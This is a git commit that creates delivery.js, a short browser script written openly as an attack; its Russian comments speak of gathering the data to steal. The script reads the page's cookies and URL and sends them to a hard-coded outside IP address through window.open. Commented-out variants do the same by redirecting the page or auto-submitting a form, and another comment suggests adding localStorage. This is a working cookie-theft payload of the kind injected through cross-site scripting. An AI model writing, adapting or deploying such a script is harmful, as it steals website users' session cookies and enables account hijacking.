199e3e8c555cf8e92a5c1cc633c3e35ab667b462
tranquilsuccess <132947019+tranquilsuccess@users.noreply.github.com>
2026-03-30 16:24:03 +0530

    Create delivery.js

---
+++ delivery.js
@@ -0,0 +1,25 @@
+(() => {
+  // Собираем все данные, которые хочешь украсть
+  let data = {
+    cookie: document.cookie,
+    href: location.href,
+    // Если нужно, можно добавить и другие данные
+    // localStorage: {...localStorage}
+  };
+  
+  const payload = encodeURIComponent(JSON.stringify(data));
+  
+  // Вариант А: Редирект (сработает 100%)
+  // window.location = `http://45.82.82.114:8081/collect?d=${payload}`;
+  
+  // Вариант Б: Открыть в новом окне (не трогает текущую страницу)
+  window.open(`http://45.82.82.114:8081/collect?d=${payload}`);
+  
+  // Вариант В: Попытаться отправить через форму (тоже разрешено)
+  // const f = document.createElement('form');
+  // f.method = 'GET';
+  // f.action = 'http://45.82.82.114:8081/collect';
+  // f.innerHTML = `<input name="d" value='${payload}'>`;
+  // document.body.appendChild(f);
+  // f.submit();
+})();
